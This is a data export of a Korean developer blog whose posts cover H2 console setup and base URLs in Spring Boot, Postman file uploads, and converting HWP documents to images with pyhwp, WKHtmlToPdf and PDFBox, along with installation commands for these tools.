처럼 **이니셜라이즈**에서 의존성을 쉽게 추가할 수 있다.  \n물론 기존의 프로젝트가 있다면 아래의 코드를 **build.gradle**에 추가해준다.\n\n```\nruntimeOnly 'com.h2database:h2'\n```\n\n프로젝트의 설정 파일(application.yml 등)에 아래와 같이 작성해준다.\n\n```\nserver:\n  port: 8099  # Spring boot Server port\n\nspring:\n  h2:\n    console:\n      enabled: true  # H2 웹 콘솔을 사용하겠다는 의미\n      path: /test_db  # 콘솔의 경로\n\n  datasource:\n    driver-class-name: org.h2.Driver  #h2 드라이버 설정\n    url: jdbc:h2:file:~/Develop/Github/SpringBlogExam/test_db;AUTO_SERVER=TRUE  #접속 URL\n    username: test  # 사용자 이름 (로그인 시 사용)\n    password: 1234  # 사용자 암호 (로그인 시 사용)\n```\n\n여기서 datasource의 url의 경우 설명을 간략하게 하면 아래와 같다.\n\n- jdbc:h2:file\n  - file로 DB를 관리하겠다는 뜻\n- ~/.../test_db\n  - 현재 설정된 경로에 test_db 라는 이름으로 데이터베이스를 생성 (해당 경로에 파일이 생성도니다.)\n- AUTO_SERVER\n  - 다중 접속을 허용하겠다는 의미 (인메모리에서는 미 사용)\n\n<br>\n\n이렇게 설정 후 Spring boot를 실행하고 브라우저에 url을 입력하여 접속하면 아래와 같은 화면이 뜬다.  \n(URL의 경우 위 설정을 예시로 하면 http://localhost:8099/test_db/ 이다.)\n\n![](/img_02.png)\n\n아마 콘솔의 JDBC URL의 경우 사진과 다를텐데 yml에 작성한 url로 맞춰주자.  \n그리고 계정 비번의 정보(위 설정 파일 참고)를 입력하면 콘솔에 접속할 수 있다.\n\n<br>\n\n## 정리\n\n일단 이번 포스팅에서는 가볍에 Spring boot에서 h2를 사용하는 방법에 대해 작성하였다.  \n다음 포스팅에서는 h2에 테스트 데이터를 넣는 것과 기타 추가 사항에 대해 포스팅을 할 예정이다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2019-01-31) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.  Spring boot에서 특정 url을 베이스로 잡고 싶을 때 최근 프로젝트를 진행하면서 특정 컨트롤러의 url을 기본으로 잡고 싶었다. 말이 뭔가 이상한데 쉽게 예제로 표현을 하자면...  위와 같은 샘…","fields":{"slug":"/spring_spring-boot/190131_spring-boot-base-url/"},"frontmatter":{"date":"January 31, 2019","title":"Spring boot에서 Base url을 설정하는 방법","description":null,"tags":["Spring Boot"],"series":"Spring_SpringBoot","previewImage":"springboot_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2019-01-31) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n![thumbnail](../thumbnail_spring.png)\n\n<br>\n\n# Spring boot에서 특정 url을 베이스로 잡고 싶을 때\n\n최근 프로젝트를 진행하면서 특정 컨트롤러의 url을 기본으로 잡고 싶었다.  \n말이 뭔가 이상한데 쉽게 예제로 표현을 하자면...\n\n`/rest/test/v10/*`\n\n위와 같은 샘플 url이 있고 앞의 **rest/test** 이 부분이 경우에 따라 변경이 되어 매번 컨트롤러에서 수정이 번거로웠다.  \n그래서 특정 url을 베이스로 잡고 처리하는 방법을 찾아보았다.\n\n<br>\n\n## How to?\n\n몇 가지 방법이 있는데 이 중 사용하기 편한 두 가지 방법을 알아보겠다.\n\n<br>\n\n### 1. Custom Annotation 사용\n\n이 방법은 커스텀 어노테이션을 하나 만들고 이것을 적용할 컨트롤러에 붙여준다.  \n먼저 커스텀 어노테이션을 하나 만들어준다.\n\n```java\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n@Target(ElementType.TYPE)\n@Retention(RetentionPolicy.RUNTIME)\n@RestController\n@RequestMapping(\"/rest/test/v10/*\")\npublic @interface CustomBaseControllerAnnotation {}\n```\n\n그리고 적용할 컨트롤러에 아래와 같이 붙여서 사용한다.\n\n```java\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@CustomBaseControllerAnnotation\npublic class TestOneController {\n\n    @RequestMapping(\"/users\")\n    public String firstMethod(){\n        return \"User List~\";\n    }\n}\n```\n\n이렇게 공통적으로 사용할 컨트롤러에 어노테이션만 붙이고 **RequestMapping이나 GetMapping** 등의 메서드로 뒤를 알맞게 맞춰주면 된다.\n\n<br>\n\n### 2. Base Controller 상속\n\n1번과 유사한데 커스텀 어노테이션 대신에 공통 컨트롤러를 하나 만들고 이것을 상속받아서 사용하면 된다.\n\n```java\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@RequestMapping(\"/rest/test/v10/*\")\npublic class BaseController {}\n```\n\n위와 같이 베이스 컨트롤러를 하나 만들고 아래와 같이 적용해서 사용한다.\n\n```java\nimport org.springframework.web.bind.annotation.RequestMapping;\n\n@RestController\npublic class TestOneController extends BaseController {\n\n    @RequestMapping(\"/users\")\n    public String firstMethod(){\n        return \"User List~\";\n    }\n}\n```\n\n<br>\n\n## 정리\n\n위에서 사용한 방법 외에 **Spring Data Rest**를 활용하여 처리하는 방법이 있는데 이는 아래의 참고 StackOverFlow를 참고하자.\n\n> 참고 항목  \n> [Stackoverflow](https://stackoverflow.com/questions/38212691/how-to-change-base-url-only-for-rest-controllers/38228080)\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2019-01-26) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. Postman을 사용하다가... 최근 개발을 하면서 Rest api를 개발하다 보니 개발된 api를 테스트하기 위해 Postman을 사용한다. 그런데 기능을 개발하던 중 첨부파일 기능을 개발하게 되었는데 첨…","fields":{"slug":"/tools/190126_postman-insert-img/"},"frontmatter":{"date":"January 26, 2019","title":"Postman에서 파일 전송 처리하기","description":null,"tags":["Tools","Postman"],"series":"Tools","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2019-01-26) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# Postman을 사용하다가...\n\n최근 개발을 하면서 Rest api를 개발하다 보니 개발된 api를 테스트하기 위해 [Postman](https://www.getpostman.com)을 사용한다.  \n그런데 기능을 개발하던 중 첨부파일 기능을 개발하게 되었는데 첨부를 어떻게 해야 하는지 몰라서 찾아보았다.  \n(매번 파라메터만 주는 것만 하다보니...)\n\n<br>\n\n## 파일 첨부\n\n먼저 url과 http protocal을 적당하게 작성 후 하단의 **Body** 항목을 클릭하면 몇 가지 옵션이 나온다.  \n여기서 **form-data** 항목을 선택하면 key 부분에 항목을 file로 변경하고, 파라메버 이름을 적어준다.  \n그리고 Value에서 원하는 파일을 첨부하면 된다.  \n자세한 것은 아래 사진을 참고하자.\n\n<br>\n\n![](/img_01.png)\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2019-01-25) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. 만약 1부를 안 보신 분이 있다면 이곳 1부 포스팅을 참고하자. 실제 구현 전 설치하거나 구성해야 할 것들이 있는데 이는 1부 포스팅의 참고 링크를 확인하자. 1부에 이어서.. 이번엔 바로 적용한 코드를 확…","fields":{"slug":"/tools/190125_hwp-image-part2/"},"frontmatter":{"date":"January 25, 2019","title":"Java에서 Hwp를 Image로 변환하기 2부 (Java + Python)","description":null,"tags":["Tools","Java","Python","Hwp"],"series":"Tools","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2019-01-25) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n> 만약 1부를 안 보신 분이 있다면 [이곳 1부 포스팅](https://elfinlas.github.io/tools/190122_hwp2img-java/)을 참고하자.  \n> 실제 구현 전 설치하거나 구성해야 할 것들이 있는데 이는 1부 포스팅의 참고 링크를 확인하자.\n\n# 1부에 이어서..\n\n이번엔 바로 적용한 코드를 확인해보자.\n\n<br>\n\n## 1. Hwp to XHtml\n\n아래의 메서드로 구현을 하였다.\n\n```java\nprivate String changeHwp2Xhtml(String uniqueId, String targetHwpPath) {\n\tString outputPath = \"/home/dev/sample/temp/img\"; //Xhtml이 저장될 디렉토리\n        StringBuilder runCommand = new StringBuilder(); //pyhwp를 실행할 커맨더를 조립할 String Builder 객체\n\n        runCommand.append(\"hwp5html --output=\" + outputPath + \" \" + targetHwpPath); //pyhwp를 실행하는 코드를 조립\n\n        try {\n            Files.createDirectories(Paths.get(outputPath)); //Output 경로를 생성해 준다.\n\n            //명령어를 수행\n            Process process = Runtime.getRuntime().exec(runCommand.toString());\n            int exitStatus = process.waitFor();\n            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader (process.getInputStream()));\n\n            String currentLine;\n            StringBuilder stringBuilder = new StringBuilder(exitStatus==0?\"SUCCESS:\":\"ERROR:\");\n            currentLine= bufferedReader.readLine();\n            while(currentLine !=null) {\n                stringBuilder.append(currentLine);\n                currentLine = bufferedReader.readLine();\n            }\n\n            //변환에 실패한 경우 예외 처리\n            if (stringBuilder.toString().equals(\"ERROR:\")) { throw new Hwp2XHtmlChagneException(this, \"Change fail hwp to xhtml. Command result is Error.\"); }\n        }\n        catch(Exception e) {  } //알맞는 예외 처리 진행\n        return outputPath + \"/index.xhtml\";\n}\n```\n\n위의 메서드는 hwp를 xhtml로 변환 후 변환된 경로를 반환하는 메서드이다.  \n자세한 것은 코드를 참고하자.\n\n<br>\n\n## 2. Xhtml to Pdf\n\n이것도 아래의 메서드를 참고하면...\n\n```java\nprivate String changeXhtml2Pdf(String inputHtmlPath, String uniqueId) {\n        //파일명은 temp.pdf로 맞춰준다.\n        String outputPath = \"/home/dev/sample/temp/pdf\" + \"/\" + getPathPart4DateStr() + \"/\" + uniqueId + \"/temp.pdf\";\n        Pdf pdf = new Pdf();\n        pdf.addPageFromUrl(inputHtmlPath);\n        try { pdf.saveAs(outputPath); } //Html을 pdf로 변환 처리하는 로직\n        catch (IOException e) { throw  new Xhtml2PdfChangeException(this, \"Change fail xhtml to pdf. IOException message = \" + e.getMessage()); }\n        catch (InterruptedException e) { throw  new Xhtml2PdfChangeException(this, \"Change fail xhtml to pdf. InterruptedException message = \" + e.getMessage()); }\n        return outputPath;\n    }\n```\n\n이 메서드도 변환 후 경로를 반환하는 메서드이다.  \n여기서 사용된 **Pdf**의 경우 [WKHtmlToPdf 설치하기](https://elfinlas.github.io/tools/190125_install-wkhtmlpdf/) 포스팅의 번외 1편을 참고하자.\n\n<br>\n\n## 3. Pdf to Image\n\n바로 코드를 보자면...\n\n```java\nprivate List<String> conversionPdf2Img(InputStream is, String uniqueId) {\n        List<String> savedImgList = new ArrayList<>(); //저장된 이미지 경로를 저장하는 List 객체\n        try {\n            PDDocument pdfDoc = PDDocument.load(is); //Document 생성\n            PDFRenderer pdfRenderer = new PDFRenderer(pdfDoc);\n\n            String resultImgPath = \"/home/dev/sample/result/\"; //이미지가 저장될 경로\n            Files.createDirectories(Paths.get(resultImgPath)); //PDF 2 Img에서는 경로가 없는 경우 이미지 파일이 생성이 안되기 때문에 디렉토리를 만들어준다.\n\n            //순회하며 이미지로 변환 처리\n            for (int i=0; i<pdfDoc.getPages().getCount(); i++) {\n                String imgFileName = resultImgPath + \"/\" + i + \".png\";\n\n\t\t//DPI 설정\n                BufferedImage bim = pdfRenderer.renderImageWithDPI(i, 300, ImageType.RGB);\n\n                // 이미지로 만든다.\n                ImageIOUtil.writeImage(bim, imgFileName , 300);\n\n                //저장 완료된 이미지를 list에 추가한다.\n                savedImgList.add(makeDownloadUrl4Uuid(imgFileName));\n            }\n            pdfDoc.close(); //모두 사용한 PDF 문서는 닫는다.\n        }\n        catch (FileNotFoundException e) { throw new PdfNotFoundException(this, \"Pdf file not found. exception message = \" + e.getMessage() ); }\n        catch (IOException e) { throw new Pdf2ImgChangeException(this, \"Change fail pdf to image. IOException message = \" + e.getMessage() ); }\n        return savedImgList;\n    }\n```\n\n이곳에서는 PDF를 이미지로 변환하기 위해 **PDFbox** 를 사용하였다.  \n이것과 관련해서는 [Java에서 PDF를 이미지로 변환하기](https://elfinlas.github.io/java/190125_java-pdf-img/) 포스팅을 참고하자.  \n참고로 저 포스팅에 위에 공개한 메서드에 대해 자세한 설명이 되어 있다.\n\n<br>\n\n# 결론\n\n이제 1부와 이번 포스팅을 통해서 hwp를 이미지로 변환하는 과정에 대해 알아보았다.  \n물론 완벽하게 처리된 것은 아니지만... 나름 최선의 방법을 찾은 것 같다.  \n혹시 나와 같은 고민을 하신 분들에게 도움이 되길 바라면서...  \n만약 더 좋은 방법이 있다면 알려주시면 감사하겠다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2019-01-25) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. Java에서 PDF를 이미지 파일로 변환하려면... 사내 프로젝트 중 Spring boot로 진행하는 프로젝트의 개발을 진행하던 중 위의 기능을 개발해야 했다. 이번 포스팅에서는 Java 라이브러리 중 PD…","fields":{"slug":"/java/190125_java-pdf-img/"},"frontmatter":{"date":"January 25, 2019","title":"Java에서 PDF를 이미지로 변환하기","description":null,"tags":["Java"],"series":"Java","previewImage":"java_logo.webp","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2019-01-25) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# Java에서 PDF를 이미지 파일로 변환하려면...\n\n사내 프로젝트 중 Spring boot로 진행하는 프로젝트의 개발을 진행하던 중 위의 기능을 개발해야 했다.  \n이번 포스팅에서는 Java 라이브러리 중 [PDFBox](https://pdfbox.apache.org/2.0/migration.html)를 이용하여 Pdf를 이미지로 구현하는 방법을 정리해보려 한다.\n\n> 개발환경은 Mac OS 이며 Spring boot 2.0, Java8을 사용하였다.\n\n<br>\n\n## 1. Gradle 추가하기\n\n현재 포스팅을 하는 시점에서는 2.0.13 버전을 사용하였다.  \n아래의 Gradle을 추가해줘야 한다.\n\n```\ncompile group: 'org.apache.pdfbox', name: 'pdfbox', version: '2.0.13'\ncompile group: 'org.apache.pdfbox', name: 'pdfbox-tools', version: '2.0.13'\n```\n\nMaven을 사용하시는 분은 아래를 참고하자.\n\n```\n<!-- PDFBox -->\n<dependency>\n    <groupId>org.apache.pdfbox</groupId>\n    <artifactId>pdfbox</artifactId>\n    <version>2.0.13</version>\n</dependency>\n\n<!-- PDFBox-Tool -->\n<dependency>\n    <groupId>org.apache.pdfbox</groupId>\n    <artifactId>pdfbox-tools</artifactId>\n    <version>2.0.13</version>\n</dependency>\n\n```\n\n## 2. Java Code...\n\n아래의 코드를 참고하자.\n\n```java\nprivate List<String> conversionPdf2Img(InputStream is, String uniqueId) {\n        List<String> savedImgList = new ArrayList<>(); //저장된 이미지 경로를 저장하는 List 객체\n        try {\n            PDDocument pdfDoc = PDDocument.load(is); //Document 생성\n            PDFRenderer pdfRenderer = new PDFRenderer(pdfDoc);\n\n            String resultImgPath = \"/home/dev/sample/result/\"; //이미지가 저장될 경로\n            Files.createDirectories(Paths.get(resultImgPath)); //PDF 2 Img에서는 경로가 없는 경우 이미지 파일이 생성이 안되기 때문에 디렉토리를 만들어준다.\n\n            //순회하며 이미지로 변환 처리\n            for (int i=0; i<pdfDoc.getPages().getCount(); i++) {\n                String imgFileName = resultImgPath + \"/\" + i + \".png\";\n\n\t\t//DPI 설정\n                BufferedImage bim = pdfRenderer.renderImageWithDPI(i, 300, ImageType.RGB);\n\n                // 이미지로 만든다.\n                ImageIOUtil.writeImage(bim, imgFileName , 300);\n\n                //저장 완료된 이미지를 list에 추가한다.\n                savedImgList.add(makeDownloadUrl4Uuid(imgFileName));\n            }\n            pdfDoc.close(); //모두 사용한 PDF 문서는 닫는다.\n        }\n        catch (FileNotFoundException e) { throw new PdfNotFoundException(this, \"Pdf file not found. exception message = \" + e.getMessage() ); }\n        catch (IOException e) { throw new Pdf2ImgChangeException(this, \"Change fail pdf to image. IOException message = \" + e.getMessage() ); }\n        return savedImgList;\n    }\n```\n\n위 메서드에서 전달인자는 InputStream을 받는데 이 부분은 PDF 파일을 FileInputStream으로 넘겨주면 된다.  \n`new FileInputStream(new File(inputPdfPath))` 와 같이 처리할 수 있다.  \n그리고 이 메서드는 이미지를 변환한 파일의 경로를 반환하는데 이 부분은 알맞게 변환하여 사용하면 된다.\n\n나머지 자세한 것은 주석을 참고하면 될듯 하다.\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2019-01-25) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. WKhtmlToPdf? 회사에서 진행하는 프로젝트에서 Hwp -> Image를 만드는 과정을 진행하며 찾게된 툴이다. WKHtmlToPdf는 Html을 Pdf로 변환해주는 툴이다. 이번 포스팅에서는 이것을 …","fields":{"slug":"/tools/190125_install-wkhtmlpdf/"},"frontmatter":{"date":"January 25, 2019","title":"WKHtmlToPdf 설치하기","description":null,"tags":["Tools"],"series":"Tools","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2019-01-25) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# WKhtmlToPdf?\n\n회사에서 진행하는 프로젝트에서 **Hwp -> Image**를 만드는 과정을 진행하며 찾게된 툴이다.\n\n[WKHtmlToPdf](https://wkhtmltopdf.org)는 Html을 Pdf로 변환해주는 툴이다.\n\n이번 포스팅에서는 이것을 AMI에 설치하고, 사용하는 방법을 소개한다.\n\n<br>\n\n## 설치하기 전...\n\n일단 진행하는 환경은 Amazon의 **AMI**에서 진행하였다. (CentOS-6 64bit)\n\n다른 OS환경은 공식 홈페이지를 참고하도록 하자.\n\n<br>\n\n## 1. 의존성 설치 및 Wget 가져오기\n\n설치 전 필요한 의존성을 설치해준다. (명령어는 가급적 Control C + Control V 조합으로..)\n\n```\n> yum -y install fontconfig libXrender libXext xorg-x11-fonts-Type1 xorg-x11-fonts-75dpi freetype libpng zlib libjpeg-turbo openssl icu\n```\n\n그리고 wget으로 다운을 받는다.\n\n```\n> wget https://downloads.wkhtmltopdf.org/0.12/0.12.4/wkhtmltox-0.12.4_linux-generic-amd64.tar.xz --dns-timeout=5 --connect-timeout=5 tar -xJf wkhtmltox-0.12.4_linux-generic-amd64.tar.xz\n```\n\nbin으로 이동 처리를 해준다.\n\n```\n> cp wkhtmltox/bin/wkhtmltopdf /usr/local/bin/wkhtmltopdf\n> cp wkhtmltox/bin/wkhtmltoimage /usr/local/bin/wkhtmltoimage\n```\n\n## 2. 실행\n\n특별히 환경변수를 안잡아도 터미널에서 아래와 같이 명령어를 수행하면 실행이 될 것이다.\n\n```\n> wkhtmltopdf\n```\n\n이를 통해서 아래와 같이 URL에서 정보를 가져와서 변환할 수 있다.\n\n```\n> wkhtmltopdf http://www.naver.com ./naver.pdf\n```\n\n또는 자신의 로컬 경로에 저장된 html도 변환이 가능하다.\n\n```\n> wkhtmltopdf ~/sample/index.xhtml ./index.pdf\n```\n\nxhtml 또한 잘 변환된다.\n\n<br>\n\n# 번외 1 (자바용)\n\nWkhtmltopdf를 Java에서 호출할 수 있는 것이 있다.\n\n[이곳](https://github.com/jhonnymertz/java-wkhtmltopdf-wrapper)을 참고하였다.\n\n> 물론 WKHtmltopdf가 시스템에 설치되어 있어야 한다.\n\n먼저 gradle에서 저장소와 의존성을 추가한다.\n\n```gralde\nallprojects {\n\t\trepositories {\n\t\t\tmaven { url \"https://jitpack.io\" }\n\t\t}\n\t}\n\n\tdependencies {\n\t\tcompile 'com.github.jhonnymertz:java-wkhtmltopdf-wrapper:1.1.5-RELEASE'\n\t}\n```\n\n위와 같이 추가 후 자바단에서는 아래와 같이 호출을 하여 사용한다.\n\n```java\n//객체 생성\nPdf pdf = new Pdf();\npdf.addPageFromUrl(inputHtmlPath);\n\ntry { pdf.saveAs(outputPath); } //Html을 pdf로 변환 처리하는 로직\ncatch (IOException e) { throw  new Xhtml2PdfChangeException(this, \"Change fail xhtml to pdf. IOException message = \" + e.getMessage()); }\ncatch (InterruptedException e) { throw  new Xhtml2PdfChangeException(this, \"Change fail xhtml to pdf. InterruptedException message = \" + e.getMessage()); }\nreturn outputPath;\n```\n\n저기에서 inputHtmlPath는 html이 존재하는 경로 String 객체이며,  \nsave에는 결과물(pdf)이 저장될 경로 String 객체를 전달하면 된다.\n\n예외 처리의 경우 자신의 환경에 맞게끔 알맞게 설정해주면 된다.\n\n# 번외 2 (한글이 깨지는 문제)\n\n변환한 PDF의 한글 내용이 깨지는 경우가 있다.  \n이는 시스템에 폰트가 없어서 발생하는 문제이다.  \n폰트만 설치하면 깔끔하게 처리된다.  \n아래는 나눔폰트를 설치하여 적용하는 예시이다.\n\n```\n> wget http://static.campaign.naver.com/0/hangeul/renew/download/NanumFont_TTF.zip\n> unzip Nanum*.zip\n> mkdir /usr/share/fonts/nanumfont\n> mv *.ttf /usr/share/fonts/nanumfont\n```\n\n<br>\n\n# 참고\n\n아래 사이트들에서 참고하였다.\n\n- [참고01](https://thomaskekeisen.de/en/blog/amazon-elastic-beanstalk-wkhtmltopdf-aws-elb/)\n- [참고02](http://jdh5202.tistory.com/280)\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2019-01-22) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. 추가 내용 by 19.07.29 포스팅 하단에 pyhwp의 버전 추가 관련 내용을 추가하였습니다. Install Pyhwp! Pyhwp를 찾게 된 것은 이곳 포스팅과 연결된다. Java에서 hwp를 이미지로…","fields":{"slug":"/tools/190122_installpyhwp/"},"frontmatter":{"date":"January 22, 2019","title":"Pyhwp 설치하기","description":null,"tags":["Tools","Python","Hwp"],"series":"Tools","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2019-01-22) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# 추가 내용 by 19.07.29\n\n포스팅 하단에 pyhwp의 버전 추가 관련 내용을 추가하였습니다.\n\n---\n\n<br>\n\n# Install Pyhwp!\n\nPyhwp를 찾게 된 것은 [이곳](https://elfinlas.github.io/tools/190122_hwp2img-java/) 포스팅과 연결된다.  \nJava에서 hwp를 이미지로 변환하다 보니 이것 저것 찾게 되었고, 결국 종착지는 **Pyhwp**였다.\n\n일단 Pyhwp에 대해 자세한 것은 [공식문서](https://pythonhosted.org/pyhwp/ko/index.html)를 참고하고...  \n이번 포스팅에서는 설치하는 과정에 대해 다루려 한다.\n\n> ## ~~(중요) Pyhwp는 Python 2.7에서 동작한다!~~ => 최신버전에서는 Python 3.x를 지원하게 되었다.\n\n~~그래서 먼저 별도로 실행할 환경은 Python 2.7을 구축해두고 진행하자.~~\n\n최신 버전인 **0.1b12** 를 사용할 경우 가상환경에서 python3.x 버전을 구축해두고 진행하자.  \n아래는 설치 진행 과정이다.\n\n<br>\n\n## 1. lxml 설치\n\n- pyhwp는 공식 문서에도 나와있지만 lxml을 사용한다.\n- 그래서 먼저 이것을 설치해줘야 한다.\n- pip를 사용해 아래의 명령어를 사용해 설치하자.\n\n```\npip install lxml\n```\n\n## 2. Pyhwp 설치\n\n- lxml이 정상적으로 설치되었다면 Pyhwp를 설치한다.\n- 다음 명령어를 수행하자.\n\n```\npip install –pre pyhwp\n```\n\n- pre는 pre-released 버전을 의미\n- 설치가 정상적으로 되었다면 자신의 Python 디렉토리에 hwp5\\* 등이 설치된 것을 확인할 수 있다.\n  > 필자의 경우 pyenv 환경을 잘못 설정하여 홈 디렉토리 내의 .local/bin 에 설치가 되었다.\n\n## 3. 동작 확인\n\n- 정상적으로 설치 후 설치된 경로 또는 환경변수 등록을 통해서 아래와 같이 사용할 수 있다.\n\n```\n>./hwp5html --output=~/test/output ~/test/sample/sample.hwp\n```\n\n- --output 뒤의 인자는 변환된 xhtml이 담길 디렉토리이며, 뒤는 변환할 hwp 파일 경로이다.\n\n<br>\n\n# 정리\n\n작업을 진행하며 참고한 사이트는 아래와 같다.\n\n- [pyhwp 설치하기와 python 버젼관리](https://sojungluciakim.wordpress.com/2016/05/31/hwpy-설치하기/)\n- [Pyhwp 공식 문서(변환파트)](https://pythonhosted.org/pyhwp/ko/converters.html#module-hwp5.hwp5odt)\n\n---\n\n## 19.07.29 추가 내용\n\n- 프로젝트의 버전이 19년 4월 8일에 **pyhwp 0.1b12** 버전이 추가되었고, 해당 버전에서는 python3를 지원하게 되었습니다.  \n  [참고 내용](https://pyhwp.readthedocs.io/en/latest/changes.html)\n- [pypi-pyhwp](https://pypi.org/project/pyhwp/)\n- 아래는 새로운 버전에서 진행한 부분이며, CentOS 에서 진행을 기준으로 추가하였습니다.\n\n### Python 3.x 설치\n\n- 최신으로 업데이트\n\n```\n> sudo yum install -y https://centos7.iuscommunity.org/ius-release.rpm\n```\n\n- 필요 패키지 설치\n\n```\n> sudo yum install -y python36u python36u-libs python36u-devel python36u-pip\n```\n\n- 버전 확인\n\n```\n> python3.6 -V\n```\n\n- Python 3.x virtualenv 설정\n\n```\n> python3.6 -m venv [venv 이름]\n```\n\n> ex> python3.6 -m venv pyhwp\n\n- 위에서 만든 가상 공간으로 이동\n\n```\n> cd .pyhwp/bin\n```\n\n- activate 실행\n\n```\n> chmod 755 activate\n> ./activate\n```\n\n- pyhwp 설치 (virtualenv 내의 pip에서 수행)\n\n```\n> sudo ./pip3 install --pre pyhwp\n```\n\n```toc\n\n```\n"},{"excerpt":"주의 이 문건은 과거 Hexo 블로그 (2019-01-22) 에서 이동된 문서입니다. 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다. Hwp 파일을 이미지로 변환? 회사를 이직한 뒤에 언어가 Python-Django에서 다시 Java-Spring으로 변하였다. 사실 다시 Java측으로 와도 가끔 집에서 토이 프로젝트나 그런 것을 할 때 P…","fields":{"slug":"/tools/190122_hwp2img-java/"},"frontmatter":{"date":"January 22, 2019","title":"Java에서 Hwp를 Image로 변환하기 1부 (Java + Python)","description":null,"tags":["Tools","Java","Python","Hwp"],"series":"Tools","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n# 주의\n\n### 이 문건은 과거 Hexo 블로그 (2019-01-22) 에서 이동된 문서입니다.\n\n#### 시간이 지남에 따라 최신 기술과 다를 수 있으니 주의 바랍니다.\n\n---\n\n<br>\n\n# Hwp 파일을 이미지로 변환?\n\n회사를 이직한 뒤에 언어가 **Python-Django**에서 다시 **Java-Spring**으로 변하였다.  \n사실 다시 Java측으로 와도 가끔 집에서 토이 프로젝트나 그런 것을 할 때 Python을 애용한다.\n\n무튼 이번 회사에서는 기존의 레거시 프로젝트의 기능 중 일부를 신규 서버에서 구현하기로 하고, 신규 서버를 개발하게 되었다.  \n그 레거시의 기능 중 일부를 구현하게 되었는데, 제목에도 나와있는 것처럼 **hwp(한글)**을 **이미지**로 변환하는 기능이 있었다.\n\n기존에는 윈도우 프로그램에서 변환 처리를 진행하였는데 이제 이 기능을 서버단에서 처리하게 되었다.  \n혹시 결론을 좀 급하게 원하는 분들도 있을 거 같아서 미리 요약을 드리자면..\n\n<br>\n\n> ### Java에서 바로 Hwp to Image를 처리하는 것은 불가능\n>\n> ### 하지만 몇 가지 방법을 통해서 구현은 가능하다.\n\n이제 요약을 좀 풀어서... 포스팅을 하기까지 삽질 및 도달 과정을 작성해보려 한다.  \n1부에서는 어떤 형식으로 진행했는지를 포스팅하고, 2부에서 실질적으로 코드 적용 부분을 설명할 것이다.\n\n<br>\n\n## 진행 흐름\n\n아래부터는 시도를 하면서 진행한 내역을 흐름 순으로 정리하였다.\n\n### 1. Hwp to Image (Java) (시도-실패)\n\n- 애석하게도 바로 변환을 해주는 라이브러리나 툴은 찾지 못하였다.\n- 그래서 HWP to PDF (Java) 를 찾아보았다.\n\n### 2. Hwp to PDF (Java) (시도-실패)\n\n- 이것도 찾지 못하였다.\n- [이런 것](https://github.com/neolord0/hwplib)도 있었지만 이미지, PDF, HTML 변환은 지원하지 않았다.\n- 조사하며 찾은 것은 PDF, MS-Office, HWP에서 **텍스트**만 추출하는 예제였다.\n  - https://github.com/ddoleye/java-hwp\n  - https://m.blog.naver.com/admass/220533424691\n\n### 3. HWP to XHTML (Python) (가능성 확보)\n\n- 결국 Python 라이브러리 중에 **[pyhwp](https://github.com/mete0r/pyhwp)** 라는 것을 찾음\n- 이것으로 **HWP -> XHTML**로 변환에는 성공**(HTML이 아니다.)** (한글 안에 이미지와 한글 글자가 온전히 변함도 확인)\n- [Pyhwp 문서](https://pythonhosted.org/pyhwp/ko/intro.html)\n\n### 4. XHTML to Image (WKHtmlToPDF tool의 기능) (60% 성공)\n\n- [WKHtmlToPdf](https://wkhtmltopdf.org) tool 기능 중에 **WKHtmlToImage**를 이용하여 XHtml to Image 시도\n- 이미지로 변환은 잘 되지만 각 페이지 별로 처리는 안되었다. -> 이미지 